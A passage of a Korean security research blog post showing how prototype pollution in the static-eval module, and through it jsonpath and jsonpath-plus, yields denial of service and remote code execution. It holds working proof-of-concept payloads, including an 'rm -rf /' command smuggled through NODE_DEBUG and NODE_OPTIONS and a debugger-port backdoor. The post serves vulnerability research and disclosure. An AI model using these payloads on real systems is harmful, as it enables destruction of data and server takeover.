class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;polluted&#x27;, function()&#123; return true; &#125;)`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(polluted); <span class="comment">// print &quot;true&quot;</span></span><br></pre></td></tr></table></figure><p>위와 같은 코드로 <code>static-eval</code> 에서의 프로토타입 오염을 확인할 수 있습니다.</p><p>프로토타입 오염 취약점은 어떻게 활용할 수 있을까요?</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;toString&#x27;, (&#123;&#125;)[&#x27;constructor&#x27;])`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"></span><br><span class="line"><span class="comment">// serve webapp</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;working!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>객체 생성자 프로토타입에 임의의 속성을 정의해 넣을 수 있는 것만으로 <code>DOS</code> 취약점으로 작용할 수 있습니다. 위 코드를 실행해보면, <code>toString</code> 속성이 오염된 상태에서 <code>express</code> 웹서버가 정상적으로 동작하지 않음을 확인할 수 있습니다.</p><hr><h2 id="Prototype-Pollution-to-Remote-Code-Execution"><a href="#Prototype-Pollution-to-Remote-Code-Execution" class="headerlink" title="Prototype Pollution to Remote Code Execution"></a>Prototype Pollution to Remote Code Execution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inst = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">inst.<span class="property">__proto__</span>.<span class="property">isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(isAdmin); <span class="comment">// print &quot;true&quot;</span></span><br></pre></td></tr></table></figure><p>프로토 타입 오염 취약점은 기본적으로 로직 바이패스에 흔히 사용될 수 있습니다.</p><p>세션에 정의되지 않은 속성값을 정의해 놓음으로서 인증을 우회한다던지 하는 방법이죠.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">command</span> = <span class="string">&#x27;console.log(&quot;executed!&quot;)&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (command) &#123;</span><br><span class="line">  <span class="built_in">eval</span>(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 rce 가 간단하게 가능했으면 좋겠지만, JS world 는 만만하지 않습니다.</p><p>객체 프로토타입 오염에 성공했다고 하더라도, 블랙박스 환경에서는 <code>Denial of Service</code> 이상의 영향력을 보이는 것이 어려울 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/nodejs/node/blob/master/lib/child_process.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line"><span class="keyword">const</span> envPairs = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    <span class="keyword">const</span> value = env[key];</span><br><span class="line">    <span class="keyword">if</span> (value !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        envPairs.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NodeJS의 내장 모듈이며, 서브 프로세스를 생성하는 데에 사용되는<br>child_process 모듈은 자식 프로세스를 생성할 때, 환경 변수를 복사하는 과정을 거치는데<br>복사 과정에 위에서 언급된 <code>for in</code> 반복문을 사용하고 있으므로</p><p>process.env 객체 내부에 직접적으로 정의되지 않았더라도<br>process.env 의 프로토 타입인 Object.prototype 객체가 오염된다면<br>자식 프로세스 생성에 쓰이는 환경 변수를 임의로 추가해낼 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE_OPTIONS=<span class="string">&#x27;--require /proc/self/environ&#x27;</span> node app.js</span><br><span class="line"><span class="comment"># same as</span></span><br><span class="line">node --require /proc/self/environ app.js</span><br></pre></td></tr></table></figure><p>또한 NodeJS 프로세스가 실행될 때, 스크립트가 실행되기 이전에 쓰이는 환경 변수중의 하나로 <code>NODE_OPTIONS</code> 환경변수가 존재하는데<br>본 변수에 <code>--require [argv]</code> 와 같은 NodeJS 프로세스 실행에 사용되는 옵션을 추가하면<br>스크립트 실행에 <code>--require [argv]</code> 추가하여 실행한 것과 같은 효과를 줍니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line">  <span class="variable constant_">NODE_DEBUG</span> : <span class="string">&#x27;require(&quot;child_process&quot;).execSync(&quot;rm -rf /&quot;)//&#x27;</span>,</span><br><span class="line">  <span class="variable constant_">NODE_OPTIONS</span> : <span class="string">&#x27;-r /proc/self/environ&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fork</span>(<span class="string">&#x27;blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">pipe</span>(process.<span class="property">stdout</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">spawnSync</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">execSync</span>(<span class="string">&#x27;node  blank&#x27;</span>).<span class="title function_">toString</span>());</span><br></pre></td></tr></table></figure><p>위 두가지를 복합적으로 사용하여 <code>RCE</code>를 유발하는 방법입니다.<br>환경 변수에 스크립트를 포함시키고, 환경 변수가 저장되는 <code>/proc/self/environ</code> 파일을 <code>require</code> 옵션 파일로 사용할 수 있습니다.</p><p>서브 프로세스 생성 시에 <code>NODE_DEBUG</code> 환경변수는 <code>/proc/self/environ</code> 에 <code>NODE_OPTIONS</code> 보다 더 앞에 작성되므로<br>일반 환경변수보다, <code>NODE_DEBUG</code> 를 사용하면, <code>reliability</code> 를 가지도록 할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;execSync&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;env&#x27;, function()&#123; return &#123;</span></span><br><span class="line"><span class="string">    NODE_DEBUG: &#x27;require(&quot;child_process&quot;).execSync(&quot;rm -rf /&quot;)//&#x27;,</span></span><br><span class="line"><span class="string">    NODE_OPTIONS: &#x27;-r /proc/self/environ&#x27;</span></span><br><span class="line"><span class="string">&#125;&#125;);`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br></pre></td></tr></table></figure><p>이를 <code>static-eval</code> 모듈에 적용하면 위와 같습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make pollution</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line">    <span class="variable constant_">NODE_OPTIONS</span> : <span class="string">&#x27;--inspect-brk=0.0.0.0:1234&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fork</span>(<span class="string">&#x27;blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">exec</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="title function_">spawnSync</span>(<span class="string">&#x27;node&#x27;</span>, [<span class="string">&#x27;blank&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><code>/proc/self/environ</code> 파일을 사용하는 이전의 방법은 리눅스 서버에서만 작동한다는 단점이 존재합니다.<br>하지만, <code>--inspect-brk</code> 옵션을 이용하여, 서버에 디버그 포트를 열도록 만듦으로서 윈도우에서도 응용 가능합니다.<br>본 옵션을 사용하여 서브 프로세스를 생성하면, 옵션에 설정된 포트로 디버거가 연결될 때가지 대기하며<br>연결이 가능할 경우, 백도어와 동일한 역할을 수행할 수 있습니다.</p><p>디버그 포트가 열리면 <code>node inspect host:port</code> 와 같은 명령을 통해 서버에 연결할 수 있습니다.<br>이후 <code>exec</code> 서브 커맨드를 사용하면 <code>exec child_process.exec(&#39;rm -rf /&#39;)</code> 와 같이 자유롭게 명령 실행이 가능합니다.</p><p><img src="/2019/10/image-3.png" alt="img"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;execSync&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`(&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;env&#x27;, function()&#123; return &#123;</span></span><br><span class="line"><span class="string">    NODE_OPTIONS: &#x27;--inspect-brk=0.0.0.0:1234&#x27;</span></span><br><span class="line"><span class="string">&#125;&#125;)`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line">evaluate(ast);</span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">&#x27;node blank&#x27;</span>);</span><br></pre></td></tr></table></figure><p>두번째 방법을 <code>static-eval</code> 모듈에 적용하면 위와 같은 모습이 됩니다.</p><hr><h2 id="Jsonpath-x2F-Jsonpath-plus"><a href="#Jsonpath-x2F-Jsonpath-plus" class="headerlink" title="Jsonpath &#x2F; Jsonpath-plus"></a>Jsonpath &#x2F; Jsonpath-plus</h2><p><code>static-eval</code> 에 의존성을 가지는 모듈인 <code>JSONPath</code> 는 <code>XML</code>에서의 <code>XPath</code> 와 같은 역할을 하도록 디자인 된, 쿼리 언어의 일종입니다. 그러나 RFC로 정의된 <code>Xpath</code> 와 달리 <code>JSONPath</code> 는 명확한 정의가 이루어지지 않았기 때문에, 구현에 많은 모호함이 있습니다.</p><p><img src="/img/2020/01/1576102306546.png" alt="img"></p><p><code>JSONPath</code> 는 <code>XPath</code> 와 마찬가지로 표현식에 일치하는 문서를 필터링하는 필터 기능을 제공하며, 문법은 위와 같습니다. 확인해보면 소괄호 안에 <code>subscript</code> 를 삽입하는 <code>static evaluation</code> 기능을 제공한다고 되어 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jp = <span class="built_in">require</span>(<span class="string">&#x27;jsonpath&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> data = [&#123;&#125;]</span><br><span class="line"><span class="keyword">var</span> names = jp.<span class="title function_">query</span>(data, <span class="string">`$..[?( (&#123;&#125;)[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;toString&#x27;, (&#123;&#125;)[&#x27;constructor&#x27;]) )]`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;working&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>발견한 취약점을 통해 <code>JSONPath</code> 를 사용하는 서버에 <code>Denial of Service</code> 를 유발할 수 있음을 확인할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;<span class="title class_">JSON</span>Path&#125; = <span class="built_in">require</span>(<span class="string">&#x27;jsonpath-plus&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> json = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> result = <span class="title class_">JSON</span>Path(&#123;<span class="attr">path</span>: <span class="string">`$..[?( @[&#x27;__proto__&#x27;][&#x27;__defineGetter__&#x27;](&#x27;toString&#x27;, @[&#x27;constructor&#x27;]) )]`</span>, json&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;working&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p><code>jsonpath-plus</code> 모듈 또한 비슷한 로직으로 구성되며, <code>static-eval</code> 모듈을 사용하기에 동일한 방법으로 <code>Denial of Service</code> 를 유발할 수 있습니다. <code>jsonpath</code>과 <code>jsonpath-plus</code> 모듈은 현재를 기준으로 각 1594만, 1382만 다운로드를 기록하였습니다.</p><hr><h2 id="Another-Exploitation"><a href="#Another-Exploitation" class="headerlink" title="Another Exploitation"></a>Another Exploitation</h2><p><code>static-eval</code> 모듈에서 <code>RCE</code>를 유발하는 다른 방법입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">name</span>: <span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// &#123;name: &quot;value&quot;&#125;</span></span><br><span class="line">obj = <span class="string">&#x27;apple&#x27;</span>, &#123;obj&#125;</span><br><span class="line"><span class="comment">// &#123;obj: &quot;apple&quot;&#125;</span></span><br><span class="line">name=<span class="string">&#x27;apple&#x27;</span>, &#123;<span class="attr">name</span>:<span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// &#123;name: &quot;value&quot;&#125;</span></span><br><span class="line">&#123;[name]:<span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// &#123;apple: &quot;value&quot;&#125;</span></span><br><span class="line">&#123;[<span class="variable language_">console</span>.<span class="title function_">log</span>(process)]:<span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line"><span class="comment">// process &#123;version: &quot;v12.10.0&quot;, versions: &#123;…&#125;, arch: &quot;x64&quot;, platform: &quot;win32&quot;, release: &#123;…&#125;, …&#125;</span></span><br></pre></td></tr></table></figure><p>자바스크립트에서 객체를 정의할 때, <code>key name</code> 부분에 배열 첨자가 사용되면 내부 스크립트를 <code>evaluation</code> 하고<br>문자열로 변환하여 <code>key</code> 값에 사용합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&#123;[process]:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">// &#123;undefined: 1&#125;</span></span><br></pre></td></tr></table></figure><p><code>static-eval</code> 모듈에서는 이러한 Expression을 처리하지 않고 있기 때문에<br>내부에 들어가는 스크립트 실행이 이루어지지 않습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unparse = <span class="built_in">require</span>(<span class="string">&#x27;escodegen&#x27;</span>).<span class="property">generate</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Function</span>(keys.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>), <span class="string">&#x27;return &#x27;</span> + <span class="title function_">unparse</span>(node)).<span class="title function_">apply</span>(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그러나 함수 생성자의 인자로 사용되면 조금 다른 동작을 보입니다.<br><code>static-eval</code> 모듈 내부에서 함수 정의에 사용하는 <code>escodegen</code> 모듈은 그 표현식을 지원하기 때문인데요.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (&#123;[process.<span class="property">version</span>]:<span class="number">1</span>&#125;);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// &#123;v12.10.0: 1&#125;</span></span><br></pre></td></tr></table></figure><p>따라서 코드를 함수 정의식 내부에 삽입하여 사용자 함수를 생성해 줌으로서<br>임의의 코드를 실행하는 것이 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;parse&#125; = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">`</span></span><br><span class="line"><span class="string">(function () &#123;</span></span><br><span class="line"><span class="string">    (&#123;</span></span><br><span class="line"><span class="string">        [process.binding(&#x27;spawn_sync&#x27;).spawn(&#123;</span></span><br><span class="line"><span class="string">            file: &#x27;calc&#x27;,</span></span><br><span class="line"><span class="string">            args: [&#x27;1&#x27;],</span></span><br><span class="line"><span class="string">            envPairs: [&#x27;y=&#x27;],</span></span><br><span class="line"><span class="string">            stdio: [&#123;</span></span><br><span class="line"><span class="string">                type: &#x27;pipe&#x27;,</span></span><br><span class="line"><span class="string">                readable: 1</span></span><br><span class="line"><span class="string">            &#125;]</span></span><br><span class="line"><span class="string">        &#125;)]: 1</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">&#125;)()`</span></span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line">evaluate(ast);</span><br></pre></td></tr></table></figure><p>전역 process 객체를 통해 임의 명령 실행을 수행한 예제입니다.</p><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a target="_blank" rel="noopener" href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/">https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/</a></li><li><a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li><li><a target="_blank" rel="noopener" href="https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/">https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/</a></li></ul></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Precedent"><span class="toc-number">2.</span> <span class="toc-text">Precedent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Static-analyze"><span class="toc-number">3.</span> <span class="toc-text">Static analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prototype-Pollution-in-static-eval"><span class="toc-number">4.</span> <span class="toc-text">Prototype Pollution in static-eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prototype-Pollution-to-Remote-Code-Execution"><span class="toc-number">5.</span> <span class="toc-text">Prototype Pollution to Remote Code Execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jsonpath-x2F-Jsonpath-plus"><span class="toc-number">6.</span> <span class="toc-text">Jsonpath &#x2F; Jsonpath-plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Another-Exploitation"><span class="toc-number">7.</span> <span class="toc-text">Another Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">8.</span> <span class="toc-text">Reference</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/bypassing-a-js-sandbox/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/bypassing-a-js-sandbox/&text=Bypassing a JS sandbox"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" 